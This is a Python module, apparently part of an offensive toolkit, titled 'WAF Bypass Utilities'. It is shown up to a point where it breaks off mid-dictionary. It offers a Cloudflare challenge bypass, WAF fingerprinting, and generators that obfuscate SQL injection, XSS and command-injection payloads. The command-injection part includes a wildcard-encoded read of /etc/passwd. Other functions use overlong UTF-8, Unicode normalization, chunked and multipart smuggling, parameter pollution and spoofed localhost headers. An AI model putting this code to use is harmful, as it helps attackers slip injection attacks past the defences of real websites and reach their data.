"""
WAF Bypass Utilities
Battle-tested techniques for bypassing Web Application Firewalls

Supports:
- Cloudflare, Akamai, Imperva/Incapsula, AWS WAF, Azure WAF, ModSecurity
- SQLi/XSS/CMDi payload obfuscation
- HTTP smuggling patterns
- Modern encoding bypasses
- Protocol-level evasion

Updated: 2026-02-04
"""

import asyncio
import base64
import random
import re
from typing import Dict, List, Tuple
from urllib.parse import quote

import aiohttp

# Try to import cloudscraper for Cloudflare bypass
try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False
    cloudscraper = None


class CloudflareBypass:
    """
    Cloudflare JS Challenge bypass using cloudscraper
    Drop-in replacement for requests that handles:
    - JavaScript challenges
    - CAPTCHA (to some extent)
    - Browser integrity checks
    """

    def __init__(self, browser: str = 'chrome', delay: float = 0):
        self.delay = delay
        self.browser = browser
        self.session = None
        self._init_session()

    def _init_session(self):
        """Initialize cloudscraper session"""
        if HAS_CLOUDSCRAPER:
            self.session = cloudscraper.create_scraper(
                browser={
                    'browser': self.browser,
                    'platform': 'linux',
                    'desktop': True,
                },
                delay=self.delay
            )
            # Set realistic headers
            self.session.headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            })
        else:
            import requests
            self.session = requests.Session()
            print("[!] Cloudscraper not installed. Install with: pip install cloudscraper")

    def get(self, url: str, **kwargs):
        """GET request with Cloudflare bypass"""
        return self.session.get(url, **kwargs)

    def post(self, url: str, **kwargs):
        """POST request with Cloudflare bypass"""
        return self.session.post(url, **kwargs)

    def request(self, method: str, url: str, **kwargs):
        """Generic request with Cloudflare bypass"""
        return self.session.request(method, url, **kwargs)

    @staticmethod
    def is_available() -> bool:
        """Check if cloudscraper is available"""
        return HAS_CLOUDSCRAPER

    def detect_protection(self, url: str) -> Dict:
        """Detect what WAF/protection is in use"""
        result = {
            'protected': False,
            'waf': None,
            'challenge_type': None,
            'bypass_possible': False
        }

        try:
            # First try with plain requests to detect protection
            import requests
            resp = requests.get(url, timeout=10, allow_redirects=False)

            # Check for Cloudflare
            cf_headers = ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id']
            for header in cf_headers:
                if header in resp.headers.get('set-cookie', '').lower() or header in [h.lower() for h in resp.headers.keys()]:
                    result['waf'] = 'Cloudflare'
                    result['protected'] = True
                    break

            # Check response for challenge page
            if resp.status_code == 503 and 'cloudflare' in resp.text.lower():
                result['challenge_type'] = 'JS Challenge'
                result['bypass_possible'] = HAS_CLOUDSCRAPER
            elif resp.status_code == 403:
                if 'cloudflare' in resp.text.lower():
                    result['waf'] = 'Cloudflare'
                    result['challenge_type'] = 'Blocked'
                    result['protected'] = True
                # Check for other WAFs
                elif 'akamai' in resp.text.lower():
                    result['waf'] = 'Akamai'
                    result['protected'] = True
                elif 'imperva' in resp.text.lower() or 'incapsula' in resp.text.lower():
                    result['waf'] = 'Imperva/Incapsula'
                    result['protected'] = True
                elif 'aws' in resp.headers.get('server', '').lower():
                    result['waf'] = 'AWS WAF'
                    result['protected'] = True

            # Check server header
            server = resp.headers.get('server', '').lower()
            if 'cloudflare' in server:
                result['waf'] = 'Cloudflare'
                result['protected'] = True
                result['bypass_possible'] = HAS_CLOUDSCRAPER

        except Exception as e:
            result['error'] = str(e)

        return result


class AsyncCloudflareSession:
    """
    Async-compatible wrapper for cloudscraper
    Uses thread pool executor to run sync cloudscraper in async context
    """

    def __init__(self):
        self.scraper = None
        if HAS_CLOUDSCRAPER:
            self.scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'linux', 'desktop': True}
            )

    async def get(self, url: str, **kwargs) -> Tuple[int, str, Dict]:
        """Async GET with Cloudflare bypass"""
        if not self.scraper:
            # Fallback to aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url, **kwargs) as resp:
                    return resp.status, await resp.text(), dict(resp.headers)

        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(
            None,
            lambda: self.scraper.get(url, **kwargs)
        )
        return response.status_code, response.text, dict(response.headers)

    async def post(self, url: str, **kwargs) -> Tuple[int, str, Dict]:
        """Async POST with Cloudflare bypass"""
        if not self.scraper:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, **kwargs) as resp:
                    return resp.status, await resp.text(), dict(resp.headers)

        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(
            None,
            lambda: self.scraper.post(url, **kwargs)
        )
        return response.status_code, response.text, dict(response.headers)


# User agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
]


def get_random_user_agent() -> str:
    """Get a random realistic user agent"""
    return random.choice(USER_AGENTS)


def get_stealth_headers() -> Dict[str, str]:
    """Get headers that look like a real browser"""
    return {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }


# Quick helper functions
def create_bypass_session() -> CloudflareBypass:
    """Create a new Cloudflare bypass session"""
    return CloudflareBypass()


async def async_request_with_bypass(url: str, method: str = 'GET', **kwargs) -> Tuple[int, str, Dict]:
    """Make an async request with WAF bypass capability"""
    session = AsyncCloudflareSession()
    if method.upper() == 'GET':
        return await session.get(url, **kwargs)
    elif method.upper() == 'POST':
        return await session.post(url, **kwargs)
    else:
        raise ValueError(f"Unsupported method: {method}")


# ============================================================================
# PART 2: PAYLOAD TAMPER/ENCODING FUNCTIONS
# SQLMap-style bypass techniques for WAF evasion
# ============================================================================

class PayloadTamper:
    """
    Payload obfuscation techniques to bypass WAF signature detection.
    Inspired by SQLMap's tamper scripts.
    """

    # Available tamper techniques
    TECHNIQUES = [
        'space2comment',      # Replace spaces with /**/
        'space2plus',         # Replace spaces with +
        'space2randomblank',  # Replace spaces with random whitespace
        'randomcase',         # Randomly change case
        'between',            # Replace > with NOT BETWEEN 0 AND
        'charencode',         # URL encode all characters
        'charunicodeencode',  # Unicode URL encode
        'apostrophemask',     # Replace ' with UTF-8 fullwidth
        'doublequotes',       # Replace ' with "
        'equaltolike',        # Replace = with LIKE
        'multiplespaces',     # Add random spaces
        'percentage',         # Add % before each char
        'commentbeforeparenth', # Add /**/ before parentheses
        'randomcomments',     # Insert random /**/ comments
        'versionedkeywords',  # Wrap keywords in MySQL version comments
        'base64encode',       # Base64 encode payload
        'hexencode',          # Hex encode strings
    ]

    @staticmethod
    def space2comment(payload: str) -> str:
        """Replace spaces with inline comments /**/"""
        return payload.replace(' ', '/**/')

    @staticmethod
    def space2plus(payload: str) -> str:
        """Replace spaces with + (useful in URLs)"""
        return payload.replace(' ', '+')

    @staticmethod
    def space2randomblank(payload: str) -> str:
        """Replace spaces with random blank characters"""
        blanks = ['\t', '\n', '\r', '\x0b', '\x0c']
        result = ''
        for char in payload:
            if char == ' ':
                result += random.choice(blanks)
            else:
                result += char
        return result

    @staticmethod
    def randomcase(payload: str) -> str:
        """Randomly change character case"""
        result = ''
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() > 0.5 else char.lower()
            else:
                result += char
        return result

    @staticmethod
    def between(payload: str) -> str:
        """Replace > with NOT BETWEEN 0 AND (SQL bypass)"""
        # Replace > X with NOT BETWEEN 0 AND X
        payload = re.sub(r'>\s*(\d+)', r'NOT BETWEEN 0 AND \1', payload)
        payload = re.sub(r'<\s*(\d+)', r'BETWEEN 0 AND \1', payload)
        return payload

    @staticmethod
    def charencode(payload: str) -> str:
        """URL-encode all characters"""
        return ''.join(f'%{ord(c):02X}' for c in payload)

    @staticmethod
    def charunicodeencode(payload: str) -> str:
        """Unicode URL-encode all characters"""
        return ''.join(f'%u{ord(c):04X}' for c in payload)

    @staticmethod
    def apostrophemask(payload: str) -> str:
        """Replace apostrophe with UTF-8 fullwidth equivalent"""
        return payload.replace("'", '%EF%BC%87')  # Fullwidth apostrophe

    @staticmethod
    def doublequotes(payload: str) -> str:
        """Replace single quotes with double quotes"""
        return payload.replace("'", '"')

    @staticmethod
    def equaltolike(payload: str) -> str:
        """Replace = with LIKE (SQL bypass)"""
        return re.sub(r"=\s*'([^']*)'", r"LIKE '\1'", payload)

    @staticmethod
    def multiplespaces(payload: str) -> str:
        """Add random number of spaces"""
        result = ''
        for char in payload:
            result += char
            if char == ' ':
                result += ' ' * random.randint(0, 3)
        return result

    @staticmethod
    def percentage(payload: str) -> str:
        """Add % before each character (IIS specific)"""
        result = ''
        for i, char in enumerate(payload):
            if char.isalnum() and random.random() > 0.5:
                result += '%' + char
            else:
                result += char
        return result

    @staticmethod
    def commentbeforeparenth(payload: str) -> str:
        """Add /**/ before parentheses"""
        return payload.replace('(', '/**/(')

    @staticmethod
    def randomcomments(payload: str) -> str:
        """Insert random SQL comments"""
        words = payload.split(' ')
        result = []
        for word in words:
            result.append(word)
            if random.random() > 0.7:
                result.append('/**/')
        return ' '.join(result)

    @staticmethod
    def versionedkeywords(payload: str) -> str:
        """Wrap SQL keywords in MySQL version comments /*!50000keyword*/"""
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR', 'ORDER', 'BY',
                    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER', 'EXEC']
        for kw in keywords:
            # Case insensitive replacement
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            version = random.choice(['50000', '50001', '50002', '40100'])
            payload = pattern.sub(f'/*!{version}{kw}*/', payload)
        return payload

    @staticmethod
    def base64encode(payload: str) -> str:
        """Base64 encode the payload"""
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def hexencode(payload: str) -> str:
        """Hex encode string literals"""
        # Convert string literals to hex
        def hex_replace(match):
            s = match.group(1)
            hex_str = '0x' + ''.join(f'{ord(c):02x}' for c in s)
            return hex_str
        return re.sub(r"'([^']*)'", hex_replace, payload)

    @classmethod
    def apply(cls, payload: str, techniques: List[str]) -> str:
        """Apply multiple tamper techniques to a payload"""
        result = payload
        for technique in techniques:
            method = getattr(cls, technique, None)
            if method:
                result = method(result)
        return result

    @classmethod
    def apply_random(cls, payload: str, count: int = 2) -> Tuple[str, List[str]]:
        """Apply random tamper techniques"""
        techniques = random.sample(cls.TECHNIQUES, min(count, len(cls.TECHNIQUES)))
        return cls.apply(payload, techniques), techniques

    @classmethod
    def generate_variants(cls, payload: str, max_variants: int = 5) -> List[Dict]:
        """Generate multiple tampered variants of a payload"""
        variants = []

        # Always include original
        variants.append({
            'payload': payload,
            'techniques': ['original'],
            'encoded': quote(payload)
        })

        # Common effective combinations
        effective_combos = [
            ['space2comment'],
            ['space2comment', 'randomcase'],
            ['space2plus', 'randomcase'],
            ['charencode'],
            ['versionedkeywords'],
            ['apostrophemask', 'space2comment'],
            ['hexencode'],
            ['between', 'space2comment'],
            ['equaltolike', 'randomcase'],
        ]

        for combo in effective_combos[:max_variants-1]:
            try:
                tampered = cls.apply(payload, combo)
                variants.append({
                    'payload': tampered,
                    'techniques': combo,
                    'encoded': quote(tampered)
                })
            except Exception:
                pass

        return variants


# XSS-specific tamper techniques
class XSSTamper:
    """XSS payload obfuscation techniques"""

    @staticmethod
    def case_variation(payload: str) -> str:
        """Vary case of HTML tags"""
        tags = ['script', 'img', 'svg', 'body', 'input', 'iframe', 'object', 'embed']
        for tag in tags:
            pattern = re.compile(f'<{tag}', re.IGNORECASE)
            mixed = ''.join(c.upper() if random.random() > 0.5 else c for c in tag)
            payload = pattern.sub(f'<{mixed}', payload)
        return payload

    @staticmethod
    def html_entities(payload: str) -> str:
        """Convert characters to HTML entities"""
        entities = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
            '/': '&#47;', '=': '&#61;'
        }
        for char, entity in entities.items():
            if random.random() > 0.5:
                payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def javascript_encode(payload: str) -> str:
        """JavaScript string escaping"""
        result = ''
        for char in payload:
            if random.random() > 0.7 and char.isalnum():
                result += f'\\x{ord(char):02x}'
            else:
                result += char
        return result

    @staticmethod
    def unicode_escape(payload: str) -> str:
        """Use unicode escapes in JavaScript"""
        result = ''
        for char in payload:
            if char.isalpha() and random.random() > 0.6:
                result += f'\\u{ord(char):04x}'
            else:
                result += char
        return result

    @staticmethod
    def fromcharcode(text: str) -> str:
        """Convert string to String.fromCharCode()"""
        codes = ','.join(str(ord(c)) for c in text)
        return f'String.fromCharCode({codes})'

    @staticmethod
    def svg_onload(script: str) -> str:
        """Wrap in SVG onload handler"""
        return f'<svg/onload={script}>'

    @staticmethod
    def img_onerror(script: str) -> str:
        """Wrap in IMG onerror handler"""
        return f'<img src=x onerror={script}>'

    @staticmethod
    def body_onload(script: str) -> str:
        """Wrap in body onload"""
        return f'<body onload={script}>'

    @staticmethod
    def event_handlers(script: str) -> List[str]:
        """Generate multiple event handler variants"""
        handlers = [
            f'<img src=x onerror={script}>',
            f'<svg/onload={script}>',
            f'<body onload={script}>',
            f'<input onfocus={script} autofocus>',
            f'<marquee onstart={script}>',
            f'<video><source onerror={script}>',
            f'<audio src=x onerror={script}>',
            f'<details open ontoggle={script}>',
            f'<object data=x onerror={script}>',
        ]
        return handlers

    @classmethod
    def generate_variants(cls, base_script: str = 'alert(1)', max_variants: int = 10) -> List[str]:
        """Generate XSS payload variants"""
        variants = []

        # Basic script tag variants
        variants.append(f'<script>{base_script}</script>')
        variants.append(f'<script>{cls.javascript_encode(base_script)}</script>')
        variants.append(f'<script>{cls.fromcharcode(base_script)}</script>')

        # Event handler variants
        variants.extend(cls.event_handlers(base_script)[:5])

        # Case variations
        for v in variants[:3]:
            variants.append(cls.case_variation(v))

        return variants[:max_variants]


# Command injection bypass techniques
class CMDiTamper:
    """Command injection payload obfuscation"""

    @staticmethod
    def command_substitution(cmd: str) -> List[str]:
        """Different command substitution syntaxes"""
        return [
            f'$({cmd})',
            f'`{cmd}`',
            f'$[{cmd}]',  # Less common
        ]

    @staticmethod
    def separator_variants(cmd: str) -> List[str]:
        """Different command separators"""
        return [
            f'; {cmd}',
            f'| {cmd}',
            f'|| {cmd}',
            f'& {cmd}',
            f'&& {cmd}',
            f'\n{cmd}',
            f'\r\n{cmd}',
            f'%0a{cmd}',  # URL encoded newline
            f'%0d%0a{cmd}',  # URL encoded CRLF
        ]

    @staticmethod
    def variable_expansion(cmd: str) -> str:
        """Use variable expansion to obfuscate"""
        # cat -> $c$a$t
        obfuscated = ''
        for char in cmd.split()[0]:  # Only first word (command)
            obfuscated += f'${char}'
        rest = ' '.join(cmd.split()[1:])
        return f'{obfuscated} {rest}' if rest else obfuscated

    @staticmethod
    def quote_breaking(cmd: str) -> List[str]:
        """Break out of quotes"""
        return [
            f"'; {cmd} #",
            f"'; {cmd} --",
            f'"; {cmd} #',
            f'`; {cmd}`',
            f"$(; {cmd})",
        ]

    @staticmethod
    def wildcard_bypass(cmd: str) -> str:
        """Use wildcards to bypass filters"""
        # cat /etc/passwd -> /???/??t /???/??????
        return cmd.replace('cat', '/???/??t').replace('/etc/passwd', '/???/??????')

    @classmethod
    def generate_variants(cls, base_cmd: str = 'id', max_variants: int = 10) -> List[str]:
        """Generate command injection variants"""
        variants = []

        variants.extend(cls.separator_variants(base_cmd)[:4])
        variants.extend(cls.command_substitution(base_cmd))
        variants.extend(cls.quote_breaking(base_cmd)[:3])
        variants.append(cls.variable_expansion(base_cmd))

        return variants[:max_variants]


# =============================================================================
# MODERN WAF BYPASS TECHNIQUES (2024-2026)
# Advanced evasion for modern WAFs: Cloudflare, AWS WAF, Azure, ModSecurity 3.x
# =============================================================================

class ModernWAFBypass:
    """
    Modern WAF bypass techniques targeting latest WAF implementations.
    Includes protocol-level, encoding, and semantic bypass methods.
    """

    # WAF fingerprint signatures
    WAF_SIGNATURES = {
        'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid'],
            'server': ['cloudflare'],
            'response_patterns': ['cloudflare', 'cf-browser-verification', 'ray id:'],
            'status_codes': [403, 503, 520, 521, 522, 523, 524]
        },
        'akamai': {
            'headers': ['x-akamai-transformed', 'akamai-grn', 'x-akamai-session-info'],
            'server': ['akamai', 'ghostlocation'],
            'response_patterns': ['akamai', 'ghost'],
            'status_codes': [403]
        },
        'aws_waf': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-apigw-id'],
            'server': ['awselb', 'amazons3', 'cloudfront'],
            'response_patterns': ['aws', 'amazon', 'request blocked'],
            'status_codes': [403, 503]
        },
        'azure_waf': {
            'headers': ['x-azure-ref', 'x-ms-request-id'],
            'server': ['microsoft-azure', 'azure'],
            'response_patterns': ['azure', 'microsoft'],
            'status_codes': [403, 502]
        },
        'imperva': {
            'headers': ['x-iinfo', 'x-cdn'],
            'server': ['imperva', 'incapsula'],
            'response_patterns': ['incapsula', 'imperva', '_incap_'],
            'status_codes': [403]
        },
        'modsecurity': {
            'headers': ['x-mod-security', 'mod_security'],
            'server': ['mod_security'],
            'response_patterns': ['modsecurity', 'mod_security', 'rules triggered'],
            'status_codes': [403, 406]
        },
        'sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache'],
            'server': ['sucuri'],
            'response_patterns': ['sucuri', 'cloudproxy'],
            'status_codes': [403]
        },
        'f5_big_ip': {
            'headers': ['x-wa-info', 'x-cnection'],
            'server': ['big-ip', 'bigip', 'f5'],
            'response_patterns': ['f5', 'big-ip', 'request rejected'],
            'status_codes': [403]
        }
    }

    @classmethod
    def detect_waf(cls, headers: Dict, body: str, status_code: int) -> Dict:
        """
        Detect which WAF is protecting the target based on response characteristics.

        Args:
            headers: Response headers dict
            body: Response body text
            status_code: HTTP status code

        Returns:
            Dict with 'waf', 'confidence', 'signatures_matched'
        """
        result = {
            'waf': None,
            'confidence': 0,
            'signatures_matched': [],
            'bypass_techniques': []
        }

        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower()
        server = headers.get('server', '').lower()

        best_match = None
        best_score = 0

        for waf_name, signatures in cls.WAF_SIGNATURES.items():
            score = 0
            matched = []

            # Check headers
            for sig_header in signatures['headers']:
                if sig_header.lower() in headers_lower:
                    score += 2
                    matched.append(f'header:{sig_header}')

            # Check server header
            for sig_server in signatures['server']:
                if sig_server in server:
                    score += 3
                    matched.append(f'server:{sig_server}')

            # Check response body
            for pattern in signatures['response_patterns']:
                if pattern in body_lower:
                    score += 1
                    matched.append(f'body:{pattern}')

            # Check status code
            if status_code in signatures['status_codes']:
                score += 1
                matched.append(f'status:{status_code}')

            if score > best_score:
                best_score = score
                best_match = waf_name
                result['signatures_matched'] = matched

        if best_score >= 2:
            result['waf'] = best_match
            result['confidence'] = min(100, best_score * 20)
            result['bypass_techniques'] = cls.get_bypass_techniques(best_match)

        return result

    @classmethod
    def get_bypass_techniques(cls, waf_name: str) -> List[str]:
        """Get recommended bypass techniques for a specific WAF"""
        techniques = {
            'cloudflare': [
                'unicode_normalization',
                'chunked_encoding',
                'case_manipulation',
                'origin_ip_bypass',
                'http2_priority_bypass'
            ],
            'akamai': [
                'parameter_pollution',
                'multipart_bypass',
                'json_unicode',
                'content_type_confusion'
            ],
            'aws_waf': [
                'unicode_bypass',
                'chunked_transfer',
                'null_byte_injection',
                'overlong_utf8'
            ],
            'azure_waf': [
                'parameter_pollution',
                'encoding_bypass',
                'multipart_injection'
            ],
            'imperva': [
                'comment_injection',
                'encoding_chain',
                'semantic_bypass',
                'header_injection'
            ],
            'modsecurity': [
                'protocol_bypass',
                'multipart_bypass',
                'double_encoding',
                'null_byte'
            ],
            'sucuri': [
                'case_variation',
                'encoding_bypass',
                'comment_obfuscation'
            ],
            'f5_big_ip': [
                'parameter_pollution',
                'overlong_encoding',
                'semantic_bypass'
            ]
        }
        return techniques.get(waf_name, ['generic_bypass'])


class AdvancedEncodingBypass:
    """
    Advanced encoding techniques for bypassing modern WAFs.
    Includes UTF-8 overlong encoding, Unicode normalization attacks,
    and multi-layer encoding chains.
    """

    @staticmethod
    def overlong_utf8(char: str) -> bytes:
        """
        Create overlong UTF-8 encoding for a character.
        This exploits differences in how WAFs and backends decode UTF-8.

        Example: '/' can be encoded as C0 AF instead of 2F
        """
        code = ord(char)
        if code < 0x80:
            # 2-byte overlong (should be 1 byte)
            return bytes([0xC0 | (code >> 6), 0x80 | (code & 0x3F)])
        return char.encode('utf-8')

    @staticmethod
    def overlong_utf8_string(s: str, chars_to_encode: str = "/<>'\"") -> str:
        """
        Apply overlong UTF-8 encoding to specific characters in a string.
        Returns URL-encoded result.
        """
        result = []
        for char in s:
            if char in chars_to_encode:
                overlong = AdvancedEncodingBypass.overlong_utf8(char)
                result.append(''.join(f'%{b:02X}' for b in overlong))
            else:
                result.append(quote(char, safe=''))
        return ''.join(result)

    @staticmethod
    def unicode_normalization_bypass(payload: str) -> List[str]:
        """
        Generate Unicode normalization attack variants.
        Exploits NFKC/NFKD normalization differences.
        """
        # Unicode characters that normalize to common attack chars
        normalizations = {
            '<': ['\uFF1C', '\uFE64', '\u226E'],  # Fullwidth, small form, not less than
            '>': ['\uFF1E', '\uFE65', '\u226F'],
            "'": ['\uFF07', '\u2019', '\u02BC'],  # Fullwidth, right single quote, modifier
            '"': ['\uFF02', '\u201C', '\u201D'],
            '/': ['\uFF0F', '\u2215', '\u2044'],  # Fullwidth, division slash, fraction slash
            '\\': ['\uFF3C', '\uFE68'],
            '(': ['\uFF08', '\uFE59'],
            ')': ['\uFF09', '\uFE5A'],
            '=': ['\uFF1D', '\uFE66'],
        }

        variants = [payload]
        for char, replacements in normalizations.items():
            if char in payload:
                for repl in replacements:
                    variants.append(payload.replace(char, repl))

        return variants[:10]

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode - encode the % signs"""
        single_encoded = quote(payload, safe='')
        return single_encoded.replace('%', '%25')

    @staticmethod
    def triple_url_encode(payload: str) -> str:
        """Triple URL encode for deeply nested decoders"""
        return AdvancedEncodingBypass.double_url_encode(
            quote(payload, safe='')
        )

    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """
        Mix different encoding schemes to confuse WAF parsers.
        Combines URL encoding, HTML entities, and Unicode.
        """
        result = []
        encodings = [
            lambda c: quote(c, safe=''),
            lambda c: f'&#x{ord(c):X};',
            lambda c: f'&#x{ord(c):x};',
            lambda c: f'&#{ord(c)};',
            lambda c: c
        ]

        for char in payload:
            result.append(random.choice(encodings)(char))

        return ''.join(result)

    @staticmethod
    def json_unicode_escape(payload: str) -> str:
        """
        Use JSON unicode escapes which may bypass text-based WAF rules.
        Example: <script> becomes \u003cscript\u003e
        """
        result = []
        for char in payload:
            if char in '<>"\'/\\':
                result.append(f'\\u{ord(char):04x}')
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def hex_entity_encode(payload: str) -> str:
        """Convert to hex HTML entities"""
        return ''.join(f'&#x{ord(c):X};' for c in payload)

    @staticmethod
    def decimal_entity_encode(payload: str) -> str:
        """Convert to decimal HTML entities"""
        return ''.join(f'&#{ord(c)};' for c in payload)


class HTTPProtocolBypass:
    """
    HTTP protocol-level bypass techniques.
    Exploits differences in how WAFs and backends parse HTTP.
    """

    @staticmethod
    def chunked_encoding_payload(payload: str) -> Tuple[Dict, bytes]:
        """
        Create chunked transfer encoding payload.
        Some WAFs don't properly reassemble chunked bodies.

        Returns: (headers, body)
        """
        headers = {
            'Transfer-Encoding': 'chunked',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        # Split payload into chunks
        chunks = []
        chunk_size = random.randint(1, 3)  # Small random chunks

        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i+chunk_size]
            chunks.append(f'{len(chunk):X}\r\n{chunk}\r\n')

        chunks.append('0\r\n\r\n')  # End chunk
        body = ''.join(chunks).encode()

        return headers, body

    @staticmethod
    def parameter_pollution(param: str, value: str) -> List[str]:
        """
        HTTP Parameter Pollution variants.
        Different servers handle duplicate parameters differently.
        """
        return [
            f'{param}=safe&{param}={value}',  # Last wins (PHP, ASP.NET)
            f'{param}={value}&{param}=safe',  # First wins (Python, Ruby)
            f'{param}[]=safe&{param}[]={value}',  # Array pollution
            f'{param}=safe&{param}%00={value}',  # Null byte pollution
            f'{param}=safe&{quote(param)}={value}',  # Encoded param name
        ]

    @staticmethod
    def content_type_confusion() -> List[str]:
        """
        Content-Type confusion payloads.
        Some WAFs only inspect certain content types.
        """
        return [
            'application/x-www-form-urlencoded',
            'application/x-www-form-urlencoded; charset=utf-8',
            'application/x-www-form-urlencoded; charset=ibm500',  # EBCDIC
            'text/plain',
            'application/json',
            'multipart/form-data; boundary=----',
            'application/octet-stream',
            'application/x-amf',  # Flash AMF
            'text/xml',
        ]

    @staticmethod
    def header_injection_bypass() -> Dict[str, str]:
        """
        Headers that may affect WAF processing.
        """
        return {
            # Some WAFs trust these headers for internal traffic
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            # Try to trigger different processing paths
            'X-HTTP-Method-Override': 'PUT',
            'X-Method-Override': 'PUT',
            'X-Original-URL': '/',
            'X-Rewrite-URL': '/',
            # Debug headers that may bypass
            'X-Debug': 'true',
            'X-Test': 'true',
            'X-Forwarded-Proto': 'https',
        }

    @staticmethod
    def multipart_bypass(param: str, payload: str) -> Tuple[Dict, bytes]:
        """
        Create multipart form-data that may bypass WAF inspection.

        Returns: (headers, body)
        """
        boundary = f'----WebKitFormBoundary{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=16))}'

        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }

        # Add decoy parameters before and after
        body_parts = []

        # Decoy
        body_parts.append(f'--{boundary}\r\n')
        body_parts.append('Content-Disposition: form-data; name="safe"\r\n\r\n')
        body_parts.append('harmless_value\r\n')

        # Actual payload with obfuscated content-disposition
        body_parts.append(f'--{boundary}\r\n')
        body_parts.append(f'Content-Disposition: form-data; name="{param}"\r\n')
        body_parts.append('Content-Type: text/plain\r\n\r\n')
        body_parts.append(f'{payload}\r\n')

        body_parts.append(f'--{boundary}--\r\n')

        body = ''.join(body_parts).encode()

        return headers, body


class SQLiWAFBypass:
    """
    SQL Injection specific WAF bypass techniques.
    Modern techniques for bypassing 2024+ WAF rule sets.
    """

    @staticmethod
    def comment_variations(payload: str) -> List[str]:
        """Generate comment obfuscation variants"""
        comments = [
            '/**/',
            '/*!*/',
            '/*!50000*/',
            '/**//**/',
            '#',
            '-- -',
            '-- ',
            ';--',
            ';#',
            '--+',
        ]

        variants = []
        for comment in comments:
            variants.append(payload.replace(' ', comment))
        return variants

    @staticmethod
    def scientific_notation_bypass(number: str) -> List[str]:
        """Use scientific notation to bypass numeric filters"""
        n = int(number)
        return [
            f'{n}',
            f'{n}e0',
            f'{n}.0e0',
            f'{n/10}e1',
            f'{n/100}e2',
            f'0x{n:X}',
            f'{n}.0',
            f'{n}.',
        ]

    @staticmethod
    def string_obfuscation(s: str) -> List[str]:
        """Obfuscate string literals"""
        variants = []

        # Concat with empty string
        variants.append(f"''||'{s}'")
        variants.append(f"concat('','{s}')")

        # Character by character
        chars = ','.join(f"CHAR({ord(c)})" for c in s)
        variants.append(f"CONCAT({chars})")

        # Hex
        hex_str = '0x' + ''.join(f'{ord(c):02x}' for c in s)
        variants.append(hex_str)

        # Reverse
        variants.append(f"REVERSE('{s[::-1]}')")

        return variants

    @staticmethod
    def keyword_bypass() -> Dict[str, List[str]]:
        """Alternative representations of SQL keywords"""
        return {
            'SELECT': [
                'SELECT', 'SeLeCt', '/*!50000SELECT*/',
                'S%45LECT', 'SEL%45CT', '%53ELECT',
                '(SELECT', 'SELECT/**/','SE/**/LECT'
            ],
            'UNION': [
                'UNION', 'UnIoN', '/*!50000UNION*/',
                'UN%49ON', '%55NION', 'UNI/**/ON',
                'UNION/**/ALL', 'UNION%0AALL'
            ],
            'FROM': [
                'FROM', 'FrOm', '/*!50000FROM*/',
                'FR%4FM', '%46ROM', 'FR/**/OM'
            ],
            'WHERE': [
                'WHERE', 'WhErE', '/*!50000WHERE*/',
                'WH%45RE', '%57HERE', 'WH/**/ERE'
            ],
            'AND': [
                'AND', 'AnD', '&&', '/*!50000AND*/',
                '%41ND', 'AN%44', 'A/**/ND'
            ],
